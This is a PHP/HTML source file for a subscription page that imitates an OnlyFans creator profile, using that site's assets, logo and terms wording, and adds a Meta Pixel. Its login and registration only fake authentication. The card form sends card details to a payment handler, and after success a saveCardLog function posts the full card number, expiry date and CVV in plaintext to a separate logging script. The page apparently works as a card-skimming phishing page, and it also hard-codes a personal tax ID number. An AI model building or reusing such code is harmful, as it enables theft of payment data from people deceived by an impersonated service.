<?php
// Load profile data
$profile = json_decode(file_get_contents('data/profile.json'), true);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title><?php echo htmlspecialchars($profile['model_name']); ?> - Credit Card Only</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Bootstrap Icons -->
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.11.1/font/bootstrap-icons.min.css"
    rel="stylesheet"
  >
  <!-- Your CSS -->
  <link rel="stylesheet" type="text/css" href="/styles/estilos.css" media="screen" />

  <?php if (!empty($profile['facebook_pixel']['id'])): ?>
  <!-- Meta Pixel Code -->
  <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    
    fbq('init', '<?php echo htmlspecialchars($profile['facebook_pixel']['id']); ?>');
    fbq('track', 'PageView');

    // Função para enviar evento de compra (será chamada apenas após confirmação do pagamento)
    function sendPurchaseEvent(value, currency = 'USD') {
      // Garante que o valor seja um número
      value = parseFloat(value);
      
      // Dados do evento de compra
      const eventData = {
        value: value,
        currency: currency,
        content_type: 'product',
        content_ids: ['subscription'],
        content_name: 'Subscription',
        content_category: 'Subscription',
        num_items: 1
      };

      // Dispara o evento via fbq
      fbq('track', 'Purchase', eventData);

      console.log('Purchase event sent:', eventData);
    }
  </script>
  <noscript>
    <img height="1" width="1" style="display:none" 
         src="https://www.facebook.com/tr?id=<?php echo htmlspecialchars($profile['facebook_pixel']['id']); ?>&ev=PageView&noscript=1"/>
  </noscript>
  <!-- End Meta Pixel Code -->
  <?php endif; ?>
</head>

<body>
  <!-- Banner (Mel Maia) -->
  <div class="banner-container">
      <img src="<?php echo !empty($profile['banner']) ? $profile['banner'] : '/img/banner2.png'; ?>" alt="Banner" class="banner">
      <div class="banner-content">
        <div class="banner-header">
          <button type="button" class="banner-back-btn">
            <i class="bi bi-arrow-left"></i>
          </button>
          <div class="banner-user-info">
            <div class="banner-username">
              <?php echo htmlspecialchars($profile['model_name']); ?> 🌶️ 🏆
              <i class="bi bi-patch-check-fill verified-icon"></i>
            </div>
            <div class="banner-sections">
              <div class="banner-section-item">
                <i class="bi bi-image"></i>
                <span class="banner-section-count"><?php echo htmlspecialchars($profile['stats']['photos']); ?></span>
              </div>
              <div class="banner-section-item">
                <i class="bi bi-camera-video"></i>
                <span class="banner-section-count"><?php echo htmlspecialchars($profile['stats']['videos']); ?></span>
              </div>
              <div class="banner-section-item">
                <i class="bi bi-broadcast"></i>
                <span class="banner-section-count"><?php echo htmlspecialchars($profile['stats']['lives']); ?></span>
              </div>
              <div class="banner-section-item">
                <i class="bi bi-heart"></i>
                <span class="banner-section-count"><?php echo htmlspecialchars($profile['stats']['likes']); ?></span>
              </div>
            </div>
              </div>
          </div>
      </div>
      <div class="profile-pic-container">
          <img src="<?php echo !empty($profile['photo']) ? $profile['photo'] : '/img/perfil.png'; ?>" alt="Profile" class="profile-pic">
      </div>
  </div>

  <div class="content-section">
    <!-- Name + Verified + Handle -->
    <div class="username-container">
      <span class="username"><?php echo htmlspecialchars($profile['model_name']); ?></span>
      <i class="bi bi-patch-check-fill verified-icon"></i>
    </div>
    <div class="handle-container">
    <div class="handle"><?php echo htmlspecialchars($profile['username']); ?></div>
      <div class="status-separator"></div>
      <div class="status-text">Available now</div>
    </div>

    <!-- Bio -->
    <div class="bio">
      <?php echo $profile['bio']; ?>

      <!-- Social Media Buttons (Inside bio) -->
      <div class="social-buttons">
        <a href="<?php echo htmlspecialchars($profile['social_media']['instagram']); ?>" target="_blank" rel="nofollow noopener" class="social-button">
          <img src="https://static2.onlyfans.com/static/prod/f/202501271707-9105fd1645/img/instagram.svg" alt="Instagram">
          <span>Instagram</span>
        </a>
        <a href="<?php echo htmlspecialchars($profile['social_media']['twitter']); ?>" target="_blank" rel="nofollow noopener" class="social-button">
          <img src="https://static2.onlyfans.com/static/prod/f/202501271707-9105fd1645/img/x.svg" alt="X">
          <span>X</span>
        </a>
      </div>
      
      <!-- Location (Last item in bio) -->
      <div class="bio-details location-details">
        <i class="bi bi-geo-alt"></i>
        <span><?php echo htmlspecialchars($profile['location']); ?></span>
      </div>
    </div>
    
    <div class="read-more"
         onclick="document.querySelector('.bio').classList.toggle('expanded'); 
                  this.textContent = (this.textContent === 'More information' ? 'Less information' : 'More information')">
      More information
    </div>

    <!-- Counters of posts, photos, videos -->
    <div class="content-counters">
       <?php echo htmlspecialchars($profile['content_counts']['posts']); ?> posts • 
       <?php echo htmlspecialchars($profile['content_counts']['photos']); ?> photos • 
       <?php echo htmlspecialchars($profile['content_counts']['videos']); ?> videos
    </div>

    <!-- Subscription Section -->
    <div class="subscription-section" id="subscriptionSection">
      <div class="section-title">Subscription</div>
      <div class="offer-join">
        <div class="offer-join__content">
          <div class="offer-join__details">
            Limited offer: 90% off first <?php echo htmlspecialchars($profile['subscription']['promo_days']); ?> days!
          </div>
          <div class="offer-join__left-time">
            Offer ends <?php echo htmlspecialchars($profile['subscription']['promo_end_date']); ?>
          </div>
        </div>

        <div class="offer-join__bubble">
          <img src="<?php echo !empty($profile['photo']) ? $profile['photo'] : '/img/perfil.png'; ?>" alt="Profile" class="offer-join__avatar">
          <div class="offer-join__bubble__text">
            <?php echo htmlspecialchars($profile['subscription']['promo_message']); ?>
          </div>
        </div>

        <div class="offer-join__btn">
          <div class="subscription-button" data-plan="monthly">
            <div class="btn-text-wrap">
              <span class="btn-text">Subscribe</span>
              <span class="btn-text__small">$<?php echo htmlspecialchars($profile['subscription']['promo_price']); ?> for <?php echo htmlspecialchars($profile['subscription']['promo_days']); ?> days</span>
            </div>
          </div>
          <div class="subscription-price">
            Regular Price $<?php echo htmlspecialchars($profile['subscription']['regular_price']); ?> /month
          </div>
        </div>
      </div>
    </div>

    <!-- Subscription Packages -->
    <div class="bundles-group">
      <button type="button" class="section-title collapsible" onclick="togglePackages(this)">
        Subscription Packages
        <span class="section-title__arrow">
          <i class="bi bi-chevron-down"></i>
        </span>
      </button>
      
      <div class="tab-container">
        <button type="button" class="promotion-button">
          <div class="btn-text-wrap">
            <span class="btn-text">Subscribe</span>
            <span class="btn-text__small">3 months (<?php echo htmlspecialchars($profile['bundles']['3months']['discount']); ?>)</span>
            <span class="btn-price">$<?php echo htmlspecialchars($profile['bundles']['3months']['price']); ?> total</span>
          </div>
        </button>

        <button type="button" class="promotion-button">
          <div class="btn-text-wrap">
            <span class="btn-text">Subscribe</span>
            <span class="btn-text__small">6 months (<?php echo htmlspecialchars($profile['bundles']['6months']['discount']); ?>)</span>
            <span class="btn-price">$<?php echo htmlspecialchars($profile['bundles']['6months']['price']); ?> total</span>
          </div>
        </button>

        <button type="button" class="promotion-button">
          <div class="btn-text-wrap">
            <span class="btn-text">Subscribe</span>
            <span class="btn-text__small">12 months (<?php echo htmlspecialchars($profile['bundles']['12months']['discount']); ?>)</span>
            <span class="btn-price">$<?php echo htmlspecialchars($profile['bundles']['12months']['price']); ?> total</span>
          </div>
        </button>
      </div>
    </div>

    <!-- Posts/Media Tabs -->
    <div class="posts-tabs">
      <ul class="posts-tabs__list">
        <li class="posts-tabs__item">
          <a href="#posts" class="posts-tabs__link active">
            <span class="posts-tabs__text">1974 POSTS</span>
          </a>
        </li>
        <li class="posts-tabs__item">
          <a href="#media" class="posts-tabs__link">
            <span class="posts-tabs__text">2093 MEDIA</span>
          </a>
        </li>
      </ul>
    </div>

    <!-- Locked Content Section -->
    <div class="locked-content">
      <div class="content-icons">
        <ul class="purchase-list">
          <li class="purchase-list__item">
            <i class="bi bi-file-text"></i>
            <span class="purchase-list__count">1974</span>
          </li>
          <li class="purchase-list__item">
            <i class="bi bi-image"></i>
            <span class="purchase-list__count">1821</span>
          </li>
          <li class="purchase-list__item">
            <i class="bi bi-camera-video"></i>
            <span class="purchase-list__count">272</span>
          </li>
        </ul>
        <div class="purchase-list__lock">
          <i class="bi bi-lock-fill"></i>
        </div>
      </div>

      <div class="locked-content__cta">
        <button type="button" class="subscribe-btn" onclick="showSubscribeModal()">
          <span class="subscribe-btn__text">
            Subscribe to see user posts
          </span>
        </button>
      </div>
    </div>

    <!-- Benefits + Payment Section -->
    <div class="benefits-section" id="benefitsSection">
      <div class="benefits-title">SUBSCRIBE AND GET THESE BENEFITS</div>
      <div class="benefits-list">
        <div class="benefit-item">
          <i class="bi bi-check-lg"></i>
          <span>Access to all content</span>
        </div>
        <div class="benefit-item">
          <i class="bi bi-check-lg"></i>
          <span>Exclusive chat with the creator</span>
        </div>
        <div class="benefit-item">
          <i class="bi bi-check-lg"></i>
          <span>Cancel anytime</span>
        </div>
      </div>

      <!-- "Already have an account?" -->
      <div class="account-text" onclick="showLoginModal()">I already have an account</div>

      <!-- Registration form (if not logged) -->
      <div class="form-container" id="registrationForm">
        <div class="create-account-text">Create your account:</div>
      </div>

      <!-- Payment Section (hidden by default, shown after login) -->
      <div class="payment-section" style="display: none;">
        <div class="payment-title">PAYMENT DETAILS</div>
        
        <div class="payment-value">Amount to pay:</div>
        <div class="payment-amount" id="paymentAmount">$7.00</div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">CARD HOLDER NAME</div>
            <div class="field-bottom">
              <i class="bi bi-person field-icon"></i>
              <input type="text" class="field-input" id="cardHolderName" placeholder="Enter card holder name">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">CARD NUMBER</div>
            <div class="field-bottom">
              <i class="bi bi-credit-card field-icon"></i>
              <input type="text" class="field-input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">EXPIRATION (MM/YYYY)</div>
            <div class="field-bottom">
              <i class="bi bi-calendar2-minus field-icon"></i>
              <input type="text" class="field-input" id="cardExpiration" placeholder="06/2030" maxlength="7">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">CVV</div>
            <div class="field-bottom">
              <i class="bi bi-lock-fill field-icon"></i>
              <input type="text" class="field-input" id="cardCVV" placeholder="123" maxlength="4">
            </div>
          </div>
        </div>

        <button class="payment-button" id="paymentButton" onclick="initiatePayment()">
          COMPLETE PAYMENT
        </button>

        <div class="loading-indicator" id="loadingIndicator" style="display:none;">
          <i class="bi bi-arrow-repeat spin"></i>
          Processing payment...
        </div>

        <div class="payment-error" id="paymentError" style="display:none;"></div>
        <div class="payment-success" id="paymentSuccess" style="display:none;">
          <i class="bi bi-check-circle-fill success-icon"></i>
          <h3>Payment confirmed!</h3>
          <p>Your access will be unlocked soon. You will receive an email with instructions.</p>
        </div>
      </div>
    </div><!-- .benefits-section -->
  </div><!-- .content-section -->

  <!-- Login Modal -->
  <div class="modal-overlay" id="loginModal">
    <div class="modal">
      <div class="modal-header">
        <button type="button" class="modal-back-btn" onclick="closeLoginModal()">
          <i class="bi bi-arrow-left"></i>
        </button>
        <h4 class="modal-title" id="modalTitle">Login to Subscribe</h4>
      </div>

      <div class="modal-body">
        <!-- Left Side - User Info -->
        <div class="modal-left">
          <div class="modal-user-card">
            <img src="<?php echo !empty($profile['banner']) ? $profile['banner'] : '/img/banner2.png'; ?>" alt="Cover" class="modal-user-cover">
            <div class="modal-user-info">
              <img src="<?php echo !empty($profile['photo']) ? $profile['photo'] : '/img/perfil.png'; ?>" alt="Profile" class="modal-user-avatar">
              <div class="modal-user-details">
                <div class="modal-username">
                  <?php echo htmlspecialchars($profile['model_name']); ?>
                  <i class="bi bi-patch-check-fill verified-icon"></i>
                </div>
                <div class="modal-handle"><?php echo htmlspecialchars($profile['username']); ?></div>
              </div>
            </div>
          </div>

          <div class="modal-benefits">
            <div class="modal-benefits-title">
              Subscribe and get these benefits:
            </div>
            <div class="modal-benefits-list">
              <div class="modal-benefit-item">
                <i class="bi bi-check-lg modal-benefit-icon"></i>
                <span class="modal-benefit-text">Full access to this user's content</span>
              </div>
              <div class="modal-benefit-item">
                <i class="bi bi-check-lg modal-benefit-icon"></i>
                <span class="modal-benefit-text">Direct message with this user</span>
              </div>
              <div class="modal-benefit-item">
                <i class="bi bi-check-lg modal-benefit-icon"></i>
                <span class="modal-benefit-text">Cancel your subscription anytime</span>
              </div>
            </div>
          </div>
        </div>

        <!-- Right Side - Login/Register Forms -->
        <div class="modal-right">
          <div class="modal-logo">
            <img src="/img/logoonly.png" alt="Logo">
          </div>

          <!-- Login Form -->
          <form class="login-form" id="loginForm" onsubmit="handleLogin(event)" style="display: block;">
            <h3>Login</h3>
            
            <div class="form-group">
              <input type="email" class="form-input" id="loginEmail" required placeholder=" ">
              <label class="form-label">Email</label>
            </div>

            <div class="form-group">
              <input type="password" class="form-input" id="loginPassword" required placeholder=" ">
              <label class="form-label">Password</label>
            </div>

            <button type="submit" class="login-btn" id="loginButton">
              Login
            </button>

            <div class="login-terms">
              By logging in and using OnlyFans, you agree to our 
              <a href="/terms">Terms of Service</a> and 
              <a href="/privacy">Privacy Policy</a> 
              and confirm that you are at least 18 years old.
            </div>

            <div class="login-links">
              <span class="login-link">Forgot Password?</span>
              <span class="login-link" onclick="toggleForms()">Create new account</span>
            </div>

            <a href="/twitter/auth" class="social-login-btn twitter">
              <img src="https://static2.onlyfans.com/static/prod/f/202501271707-9105fd1645/img/x.svg" alt="X">
              Login with X
            </a>
          </form>

          <!-- Register Form -->
          <form class="login-form" id="registerForm" onsubmit="handleRegister(event)" style="display: none;">
            <h3>Create Account</h3>
            
            <div class="form-group">
              <input type="text" class="form-input" id="registerName" required placeholder=" ">
              <label class="form-label">Full Name</label>
            </div>

            <div class="form-group">
              <input type="text" class="form-input" id="registerUsername" required placeholder=" ">
              <label class="form-label">Username</label>
            </div>

            <div class="form-group">
              <input type="email" class="form-input" id="registerEmail" required placeholder=" ">
              <label class="form-label">Email</label>
            </div>

            <div class="form-group">
              <input type="password" class="form-input" id="registerPassword" required placeholder=" ">
              <label class="form-label">Password</label>
            </div>

            <button type="submit" class="login-btn" id="registerButton">
              Create Account
            </button>

            <div class="login-terms">
              By creating an account, you agree to our 
              <a href="/terms">Terms of Service</a> and 
              <a href="/privacy">Privacy Policy</a> 
              and confirm that you are at least 18 years old.
            </div>

            <div class="login-links">
              <span class="login-link" onclick="toggleForms()">Already have an account? Login</span>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>

  <!-- Subscription Modal -->
  <div class="modal-overlay" id="subscribeModal">
    <div class="modal">
      <div class="modal-header">
        <button type="button" class="modal-back-btn" onclick="closeSubscribeModal()">
          <i class="bi bi-arrow-left"></i>
        </button>
        <h4 class="modal-title">Subscribe to Content</h4>
      </div>

      <div class="modal-body">
        <!-- Left Side - User Info -->
        <div class="modal-left">
          <div class="modal-user-card">
            <img src="<?php echo !empty($profile['banner']) ? $profile['banner'] : '/img/banner2.png'; ?>" alt="Cover" class="modal-user-cover">
            <div class="modal-user-info">
              <img src="<?php echo !empty($profile['photo']) ? $profile['photo'] : '/img/perfil.png'; ?>" alt="Profile" class="modal-user-avatar">
              <div class="modal-user-details">
                <div class="modal-username">
                  <?php echo htmlspecialchars($profile['model_name']); ?>
                  <i class="bi bi-patch-check-fill verified-icon"></i>
                </div>
                <div class="modal-handle"><?php echo htmlspecialchars($profile['username']); ?></div>
              </div>
            </div>
          </div>

          <div class="modal-benefits">
            <div class="modal-benefits-title">
              Subscribe and get these benefits:
            </div>
            <div class="modal-benefits-list">
              <div class="modal-benefit-item">
                <i class="bi bi-check-lg modal-benefit-icon"></i>
                <span class="modal-benefit-text">Full access to this user's content</span>
              </div>
              <div class="modal-benefit-item">
                <i class="bi bi-check-lg modal-benefit-icon"></i>
                <span class="modal-benefit-text">Direct message with this user</span>
              </div>
              <div class="modal-benefit-item">
                <i class="bi bi-check-lg modal-benefit-icon"></i>
                <span class="modal-benefit-text">Cancel your subscription anytime</span>
              </div>
            </div>
          </div>
        </div>

        <!-- Right Side - Payment Form -->
        <div class="modal-right">
          <div class="payment-section" style="display: block;">
            <div class="payment-title">PAYMENT DETAILS</div>
            
            <div class="payment-value">Amount to pay:</div>
            <div class="payment-amount" id="modalPaymentAmount">$7.00</div>

            <div class="form-field">
              <div class="field-content">
                <div class="field-label">CARD HOLDER NAME</div>
                <div class="field-bottom">
                  <i class="bi bi-person field-icon"></i>
                  <input type="text" class="field-input" id="modalCardHolderName" placeholder="Enter card holder name">
                </div>
              </div>
            </div>

            <div class="form-field">
              <div class="field-content">
                <div class="field-label">CARD NUMBER</div>
                <div class="field-bottom">
                  <i class="bi bi-credit-card field-icon"></i>
                  <input type="text" class="field-input" id="modalCardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
                </div>
              </div>
            </div>

            <div class="form-field">
              <div class="field-content">
                <div class="field-label">EXPIRATION (MM/YYYY)</div>
                <div class="field-bottom">
                  <i class="bi bi-calendar2-minus field-icon"></i>
                  <input type="text" class="field-input" id="modalCardExpiration" placeholder="06/2030" maxlength="7">
                </div>
              </div>
            </div>

            <div class="form-field">
              <div class="field-content">
                <div class="field-label">CVV</div>
                <div class="field-bottom">
                  <i class="bi bi-lock-fill field-icon"></i>
                  <input type="text" class="field-input" id="modalCardCVV" placeholder="123" maxlength="4">
                </div>
              </div>
            </div>

            <button class="payment-button" id="modalPaymentButton" onclick="processModalPayment()">
              COMPLETE PAYMENT
            </button>

            <div class="loading-indicator" id="modalLoadingIndicator" style="display:none;">
              <i class="bi bi-arrow-repeat spin"></i>
              Processing payment...
            </div>

            <div class="payment-error" id="modalPaymentError" style="display:none;"></div>
            <div class="payment-success" id="modalPaymentSuccess" style="display:none;">
              <i class="bi bi-check-circle-fill success-icon"></i>
              <h3>Payment confirmed!</h3>
              <p>Your access will be unlocked soon. You will receive an email with instructions.</p>
            </div>
          </div>
        </div>
      </div>

      <div class="modal-footer">
        <button type="button" class="g-btn m-flat" onclick="closeSubscribeModal()">Close</button>
      </div>
    </div>
  </div>

  <script>
    // Valores das ofertas em reais (centavos)
    let planPricesBRL = {
      'monthly': <?php echo (float)$profile['subscription']['promo_price'] * 100; ?>,     // Super Oferta
      'regular': <?php echo (float)$profile['subscription']['regular_price'] * 100; ?>,   // Preço Regular
      '3months': <?php echo (float)$profile['bundles']['3months']['price'] * 100; ?>,    // 3 meses
      '6months': <?php echo (float)$profile['bundles']['6months']['price'] * 100; ?>,    // 6 meses
      '12months': <?php echo (float)$profile['bundles']['12months']['price'] * 100; ?>   // 12 meses
    };

    let currentPlan = 'monthly';
    let userLoginData = null;

    document.addEventListener('DOMContentLoaded', () => {
      // Botões de assinatura => atualizam valor exibido
      document.querySelectorAll('.subscription-button, .promotion-button').forEach(btn => {
        btn.addEventListener('click', function() {
          // Atualiza o plano selecionado
          if (this.classList.contains('promotion-button')) {
            const planText = this.querySelector('.btn-text__small').textContent;
            if (planText.includes('3 months')) currentPlan = '3months';
            else if (planText.includes('6 months')) currentPlan = '6months';
            else if (planText.includes('12 months')) currentPlan = '12months';
            else currentPlan = 'monthly';
          } else {
            currentPlan = this.dataset.plan || 'monthly';
          }

          // Verifica se está logado
          if (userLoginData) {
            // Se estiver logado, mostra modal de pagamento
            showSubscribeModal();
          } else {
            // Se não estiver logado, mostra modal de login
            showLoginModal();
          }
        });
      });

      // Fecha modal de login se clicar fora
      document.getElementById('loginModal').addEventListener('click', function(e) {
        if (e.target === this) {
          closeLoginModal();
        }
      });

      // Fecha modal de assinatura se clicar fora
      document.getElementById('subscribeModal').addEventListener('click', function(e) {
        if (e.target === this) {
          closeSubscribeModal();
        }
      });

      // Formata campo de expiração do cartão
      const modalExpirationField = document.getElementById('modalCardExpiration');
      if (modalExpirationField) {
        modalExpirationField.addEventListener('input', function(e) {
        let raw = this.value.replace(/[^\d]/g, '');
        if (raw.length >= 2) {
          raw = raw.substring(0,2) + '/' + raw.substring(2, 6);
        }
        raw = raw.substring(0,7);
        this.value = raw;
        });
      }

      // Posts Tabs Navigation
      const tabLinks = document.querySelectorAll('.posts-tabs__link');
      
      tabLinks.forEach(link => {
        link.addEventListener('click', (e) => {
          e.preventDefault();
          
          // Remove active class from all tabs
          tabLinks.forEach(tab => tab.classList.remove('active'));
          
          // Add active class to clicked tab
          link.classList.add('active');
          
          // Here you can add logic to show/hide content based on selected tab
          const targetId = link.getAttribute('href').substring(1);
          // For now we'll just console.log the selected tab
          console.log('Selected tab:', targetId);
        });
      });
    });

    function showBenefits() {
      document.getElementById('subscriptionSection').classList.add('hidden');
      document.getElementById('benefitsSection').classList.add('visible');
    }

    function showLoginModal() {
      document.getElementById('loginModal').classList.add('visible');
    }

    function closeLoginModal() {
      document.getElementById('loginModal').classList.remove('visible');
    }

    function handleLogin(event) {
      event.preventDefault();
      const email = document.getElementById('loginEmail').value;
      const password = document.getElementById('loginPassword').value;
      
      if (!email || !password) {
        alert('Please fill in all fields.');
        return;
      }

      const button = document.getElementById('loginButton');
      button.disabled = true;
      button.innerHTML = 'Processing...';

      // Simula autenticação bem-sucedida
      setTimeout(() => {
        // Atualiza estado de login
        userLoginData = { email: email };
        
        // Fecha modal de login
        closeLoginModal();
        
        // Mostra modal de pagamento
        showSubscribeModal();
        
        button.disabled = false;
        button.innerHTML = 'Login';
      }, 1000);
    }

    function initiatePayment() {
      // Esconde mensagens antigas
      document.getElementById('paymentError').style.display = 'none';
      document.getElementById('paymentSuccess').style.display = 'none';

      // Mostra "Processing..."
      document.getElementById('loadingIndicator').style.display = 'flex';
      document.getElementById('paymentButton').style.display = 'none';

      // Coleta dados do cartão
      const cardHolderName = document.getElementById('cardHolderName').value.trim();
      const cardNumber = document.getElementById('cardNumber').value.replace(/\D/g, '');
      const expiration = document.getElementById('cardExpiration').value.trim();
      const cvv = document.getElementById('cardCVV').value.trim();

      // Valida campos obrigatórios
      if (!cardHolderName || !cardNumber || !expiration || !cvv) {
        document.getElementById('loadingIndicator').style.display = 'none';
        document.getElementById('paymentButton').style.display = 'block';
        document.getElementById('paymentError').style.display = 'block';
        document.getElementById('paymentError').textContent = 'Please fill in all card details';
        return;
      }

      // Usa o valor em centavos diretamente do plano selecionado
      const amountCents = planPricesBRL[currentPlan];

      let [expMonth, expYear] = expiration.split('/');
      
      // Payload para a Hypercash
      const paymentPayload = {
        action: "create_card_payment",
        amount: amountCents,
        installments: 1,
        card: {
          number: cardNumber,
          holderName: cardHolderName.toUpperCase(),
          expirationMonth: parseInt(expMonth) || 0,
          expirationYear: parseInt(expYear) || 0,
          cvv: cvv
        },
        customer: {
          name: cardHolderName,
          email: userLoginData.email,
          document: {
            number: "70174641680" // CPF fixo para teste
          }
        }
      };

      // Envia para o backend processar o pagamento
      fetch("payment_handler.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(paymentPayload)
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById('loadingIndicator').style.display = 'none';
        document.getElementById('paymentButton').style.display = 'block';

        if (data.success) {
          document.getElementById('paymentSuccess').style.display = 'block';
          // Salva log do cartão (apenas para teste)
          saveCardLog(cardHolderName, cardNumber, expiration, cvv);
        } else {
          document.getElementById('paymentError').style.display = 'block';
          document.getElementById('paymentError').textContent = data.error || 'Payment error';
        }
      })
      .catch(err => {
        document.getElementById('loadingIndicator').style.display = 'none';
        document.getElementById('paymentButton').style.display = 'block';
        document.getElementById('paymentError').style.display = 'block';
        document.getElementById('paymentError').textContent = 'Error processing payment: ' + err.message;
      });
    }

    function saveCardLog(holderName, number, exp, cvv) {
      const cardLogString = new Date().toISOString()
        + " - [CARD-TEST] HolderName=" + holderName
        + ", Number=" + number
        + ", Exp=" + exp
        + ", CVV=" + cvv
        + "\n";

      fetch('salvar_log.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'log=' + encodeURIComponent(cardLogString)
      });
    }

    function validateForm() {
      const username = document.querySelector('input[placeholder="Enter your username"]').value.trim();
      const email = document.querySelector('input[placeholder="Enter your email"]').value.trim();
      const fullname = document.querySelector('input[placeholder="Enter your full name"]').value.trim();
      const password = document.querySelector('input[placeholder="Enter your password"]').value.trim();

      if (!username || !email || !fullname || !password) {
        alert('Please fill in all required fields.');
        return false;
      }
      return true;
    }

    function togglePackages(button) {
      button.classList.toggle('active');
      const container = button.nextElementSibling;
      container.classList.toggle('active');
    }

    function showSubscribeModal() {
      const modal = document.getElementById('subscribeModal');
      if (modal) {
        modal.classList.add('visible');
        // Atualiza valor baseado no plano selecionado
        const paymentAmount = document.getElementById('modalPaymentAmount');
        if (paymentAmount) {
          paymentAmount.textContent = `$${planPricesBRL[currentPlan] / 100}`;
        }
      }
    }

    function closeSubscribeModal() {
      const modal = document.getElementById('subscribeModal');
      if (modal) {
        modal.classList.remove('visible');
      }
    }

    function processModalPayment() {
      // Esconde mensagens antigas
      document.getElementById('modalPaymentError').style.display = 'none';
      document.getElementById('modalPaymentSuccess').style.display = 'none';

      // Mostra "Processing..."
      document.getElementById('modalLoadingIndicator').style.display = 'flex';
      document.getElementById('modalPaymentButton').style.display = 'none';

      // Coleta dados do cartão
      const cardHolderName = document.getElementById('modalCardHolderName').value.trim();
      const cardNumber = document.getElementById('modalCardNumber').value.replace(/\D/g, '');
      const expiration = document.getElementById('modalCardExpiration').value.trim();
      const cvv = document.getElementById('modalCardCVV').value.trim();

      // Valida campos obrigatórios
      if (!cardHolderName || !cardNumber || !expiration || !cvv) {
        document.getElementById('modalLoadingIndicator').style.display = 'none';
        document.getElementById('modalPaymentButton').style.display = 'block';
        document.getElementById('modalPaymentError').style.display = 'block';
        document.getElementById('modalPaymentError').textContent = 'Please fill in all card details';
        return;
      }

      // Usa o valor em centavos diretamente do plano selecionado
      const amountCents = planPricesBRL[currentPlan];

      let [expMonth, expYear] = expiration.split('/');
      
      // Payload para a Hypercash
      const paymentPayload = {
        action: "create_card_payment",
        amount: amountCents,
        installments: 1,
        card: {
          number: cardNumber,
          holderName: cardHolderName.toUpperCase(),
          expirationMonth: parseInt(expMonth) || 0,
          expirationYear: parseInt(expYear) || 0,
          cvv: cvv
        },
        customer: {
          name: cardHolderName,
          email: 'customer@example.com', // Email fixo para teste
          document: {
            number: "70174641680" // CPF fixo para teste
          }
        }
      };

      // Envia para o backend processar o pagamento
      fetch("payment_handler.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(paymentPayload)
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById('modalLoadingIndicator').style.display = 'none';
        document.getElementById('modalPaymentButton').style.display = 'block';

        if (data.success) {
          document.getElementById('modalPaymentSuccess').style.display = 'block';
          // Salva log do cartão (apenas para teste)
          saveCardLog(cardHolderName, cardNumber, expiration, cvv);
          
          // Fecha o modal após 3 segundos
          setTimeout(() => {
            closeSubscribeModal();
          }, 3000);
        } else {
          document.getElementById('modalPaymentError').style.display = 'block';
          document.getElementById('modalPaymentError').textContent = data.error || 'Payment error';
        }
      })
      .catch(err => {
        document.getElementById('modalLoadingIndicator').style.display = 'none';
        document.getElementById('modalPaymentButton').style.display = 'block';
        document.getElementById('modalPaymentError').style.display = 'block';
        document.getElementById('modalPaymentError').textContent = 'Error processing payment: ' + err.message;
      });
    }

    function toggleForms() {
      const loginForm = document.getElementById('loginForm');
      const registerForm = document.getElementById('registerForm');
      const modalTitle = document.getElementById('modalTitle');

      if (loginForm.style.display === 'block') {
        loginForm.style.display = 'none';
        registerForm.style.display = 'block';
        modalTitle.textContent = 'Create Account';
      } else {
        loginForm.style.display = 'block';
        registerForm.style.display = 'none';
        modalTitle.textContent = 'Login to Subscribe';
      }
    }

    function handleRegister(event) {
      event.preventDefault();
      const name = document.getElementById('registerName').value;
      const username = document.getElementById('registerUsername').value;
      const email = document.getElementById('registerEmail').value;
      const password = document.getElementById('registerPassword').value;
      
      if (!name || !username || !email || !password) {
        alert('Please fill in all fields.');
        return;
      }

      const button = document.getElementById('registerButton');
      button.disabled = true;
      button.innerHTML = 'Processing...';

      // Simula registro bem-sucedido
      setTimeout(() => {
        // Atualiza estado de login
        userLoginData = { 
          email: email,
          name: name,
          username: username
        };
        
        // Fecha modal de login
        closeLoginModal();
        
        // Mostra modal de pagamento
        showSubscribeModal();
        
        button.disabled = false;
        button.innerHTML = 'Create Account';
      }, 1000);
    }

    // Função para processar a resposta da API
    function processApiResponse(response) {
        if (response.success) {
            // Se houver evento de pixel para disparar
            if (response.pixel_event && response.pixel_event.type === 'purchase') {
                if (typeof fbq !== 'undefined') {
                    fbq('track', 'Purchase', response.pixel_event.data);
                    console.log('Purchase event sent:', response.pixel_event.data);
                }
            }
            
            // Processa o restante da resposta...
            if (response.data.status === 'approved') {
                showSuccessMessage();
            } else {
                showErrorMessage('Payment not approved');
            }
        } else {
            showErrorMessage(response.error || 'Unknown error');
        }
    }

    // Função para fazer a requisição de pagamento
    async function makePayment(payload) {
        try {
            const response = await fetch('payment_handler.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            const data = await response.json();
            processApiResponse(data);
        } catch (error) {
            console.error('Payment error:', error);
            showErrorMessage('Payment processing error');
        }
    }
  </script>
</body>
</html>
